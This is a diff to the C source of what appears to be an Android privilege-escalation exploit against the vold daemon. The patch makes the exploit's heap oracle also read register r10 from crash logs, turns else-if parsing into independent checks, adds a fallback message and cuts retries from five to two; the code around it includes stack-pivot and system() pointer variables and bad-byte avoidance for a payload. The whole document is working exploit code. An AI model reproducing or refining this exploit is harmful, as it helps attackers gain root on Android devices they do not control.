@@ -47,7 +47,7 @@ static char *vold = "/system/bin/vold";
 uint32_t heap_addr;
 uint32_t libc_base;
 uint32_t heap_base_addr;
-uint32_t r9, fp;
+uint32_t r9 = 0, r10 = 0, fp = 0;
 uint32_t stack_addr = 0x41414141;
 uint32_t system_ptr = 0;
 uint32_t stack_pivot = 0x41414141;
@@ -161,13 +161,21 @@ static int bad_byte(uint8_t byte)
 
 
 static void heap_oracle() {
+	char ok = 1;
 	if (r9 > heap_base_addr && r9 < (heap_base_addr+0x10000))
 		heap_addr = r9 + 0x70;
+	else if (r10 > heap_base_addr && r10 < (heap_base_addr+0x10000))
+		heap_addr = r10 + 0x70;
 	else if (fp > heap_base_addr && fp < (heap_base_addr+0x10000))
 		heap_addr = fp + 0x70;
+	else
+		ok = 0;
 
 	while(bad_byte(heap_addr&0xff)) heap_addr += 0x20;
-	printf("[+] Overseer found a path ! 0x%08x\n", heap_addr);
+	if(ok)
+		printf("[+] Overseer found a path ! 0x%08x\n", heap_addr);
+	else
+		printf("[-] No path found, let's hope ...\n");
 }
 
 
@@ -348,11 +356,15 @@ static uint32_t checkcrash()
 			break;
 		if ((ptr = strstr(buf, "  sp ")) != NULL)
 			ret = 1;
-		else if ((ptr = strstr(buf, "  r9 ")) != NULL) {
+		if ((ptr = strstr(buf, "  r9 ")) != NULL) {
 			ptr += 5;
 			r9 = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-		else if ((ptr = strstr(buf, "  fp ")) != NULL) {
+		if ((ptr = strstr(buf, "  10 ")) != NULL) {
+			ptr += 5;
+			r10 = (uint32_t)strtoul(ptr, NULL, 16);
+		}
+		if ((ptr = strstr(buf, "  fp ")) != NULL) {
 			ptr += 5;
 			fp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
@@ -398,19 +410,23 @@ static uint32_t find_stack_addr()
 			ptr -= 8;
 			stack_addr = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-		else if ((ptr = strstr(buf, "  5245564f")) != NULL && !over) {
+		if ((ptr = strstr(buf, "  5245564f")) != NULL && !over) {
 			ptr -= 8;
 			over = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-		else if ((ptr = strstr(buf, "  sp ")) != NULL && !sp) {
+		if ((ptr = strstr(buf, "  sp ")) != NULL && !sp) {
 			ptr += 5;
 			sp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-		else if ((ptr = strstr(buf, "  r9 ")) != NULL) {
+		if ((ptr = strstr(buf, "  r9 ")) != NULL) {
 			ptr += 5;
 			r9 = (uint32_t)strtoul(ptr, NULL, 16);
 		}
-		else if ((ptr = strstr(buf, "  fp ")) != NULL) {
+		if ((ptr = strstr(buf, "  10 ")) != NULL) {
+			ptr += 5;
+			r10 = (uint32_t)strtoul(ptr, NULL, 16);
+		}
+		if ((ptr = strstr(buf, "  fp ")) != NULL) {
 			ptr += 5;
 			fp = (uint32_t)strtoul(ptr, NULL, 16);
 		}
@@ -503,7 +519,7 @@ int main(int argc, char **argv, char **env)
 		exit(-1);
 	}
 
-	for (tries = 0; tries < 5; tries++) {
+	for (tries = 0; tries < 2; tries++) {
 		heap_oracle();
 		find_stack_addr();
 
